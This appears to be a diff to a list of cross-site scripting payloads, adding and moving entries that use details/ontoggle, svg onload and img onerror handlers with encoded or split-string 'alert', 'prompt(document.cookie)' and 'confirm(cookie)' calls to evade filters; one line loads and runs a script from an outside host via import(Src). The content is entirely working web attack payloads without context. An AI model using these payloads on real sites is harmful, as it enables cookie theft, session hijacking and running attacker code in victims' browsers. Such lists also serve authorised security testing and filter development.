@@ -1,4 +1,6 @@
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 ';k='e'%0Atop['al'+k+'rt'](1)//
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
 <svg/onload=window["al"+"ert"]1337>
@@ -16,11 +18,9 @@
 <svg onload='new Function["Y000!"].find(al\u0065rt)'>
 <Img Src=//X55.is OnLoad%0C=import(Src)>
 <sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
-<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
 lert&#x000000028;origin&#x000029;>
 /(A(%22onerror='alert%60123%60'test))/
 <Svg On Only=1 Onload=alert(1337)>
-<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 "><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
 <Img Src=OnXSS OnError=confirm("Hacked_by_mijan")>
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
